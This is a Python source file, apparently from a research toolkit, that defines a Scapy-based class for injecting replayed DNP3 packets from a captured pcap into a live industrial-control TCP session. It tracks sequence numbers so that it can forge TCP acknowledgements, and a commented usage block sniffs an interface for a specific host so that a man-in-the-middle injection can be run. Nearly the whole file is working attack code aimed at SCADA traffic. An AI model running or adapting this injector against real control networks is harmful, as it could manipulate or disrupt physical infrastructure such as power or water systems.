__author__ = 'Nicholas Rodofile'
from DNP3_Injection_replay_updater import *
from scapy.all import IP, TCP

'''

injector = InjectionReplayUpdaterAck("mitm/replay_20160225_1634.pcap")
sniff(iface='eth1', filter="tcp and host 192.168.10.221", prn=injector.process_pkt, count=600)

'''

class InjectionReplayUpdaterAck(InjectionReplayUpdater):
    def __init__(self, pcap):
        Inject.__init__(self)
        self.pcap = rdpcap(pcap)
        self.pcap_count = 0
        self.dnp3 = self.pcap[self.pcap_count][DNP3]
        self.ack = 0

    def inject_packet(self):
        if self.pcap_count < len(self.pcap):
            p = self.pcap[self.pcap_count]
            #self.tcp.seq = self.tcp.seq + len(p[DNP3])
            self.tcp_ip = self.ether/self.ip/self.tcp
            dnp3 = self.tcp_ip/p[DNP3]
            self.sendp(dnp3)
            self.ack = self.tcp.seq + len(p[DNP3])
            self.pcap_count += 1

    def ack_injection(self, p):
        ack = self.tcp_ip
        ack[TCP].flags = "A"
        ack[TCP].seq = p[TCP].ack
        ack[TCP].ack = p[TCP].seq + len(p[DNP3])
        self.sendp(ack)

    def process_pkt(self, p):
        if p.haslayer(DNP3):
            if p[DNP3].CONTROL.DIR == 0:
                self.update_injection(p)
            if p.haslayer(DNP3ApplicationRequest):
                if p[TCP].ack == self.ack:
                    self.ack_injection(p)
